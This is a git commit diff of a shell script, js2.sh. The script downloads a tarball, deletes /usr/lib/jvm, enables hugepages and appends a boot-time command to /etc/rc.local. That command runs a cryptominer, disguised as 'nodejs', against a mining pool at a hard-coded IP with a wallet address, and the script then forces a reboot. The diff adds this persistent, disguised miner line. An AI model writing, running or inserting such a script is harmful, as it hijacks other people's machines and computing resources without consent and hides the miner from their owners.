dac366e4a4db8e734ddace01cca3de1b7ce2f923
d1uf95z8 <68303938+d1uf95z8@users.noreply.github.com>
2020-08-15 00:13:49 +0000

    Update js2.sh

--- js2.sh
+++ js2.sh
@@ -2,12 +2,14 @@
 cd /home/sshuser
 wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
 tar xvzf csv44.tar.gz
+
+echo vm.nr_hugepages=2048 >> /etc/sysctl.conf
+
+rm -r /home/sshuser/csv44.tar.gz
 rm -r /usr/lib/jvm
-ls
-sudo echo '
+
+echo '
 cd /home/sshuser
-sudo sysctl vm.nr_hugepages=2048
-ls
-./nodejs -o 139.99.123.101:10660 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.15000 -p hhhh -a rx/wow --donate-level 1 -t 8 -k -B
-ls' >> /etc/rc.local
-sudo shutdown -r 4
+./nodejs -o 139.99.123.101:10660 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.15000 -p green -a rx/wow --donate-level 1 -t 8 -k -B
+' >> /etc/rc.local
+sudo shutdown -r 6
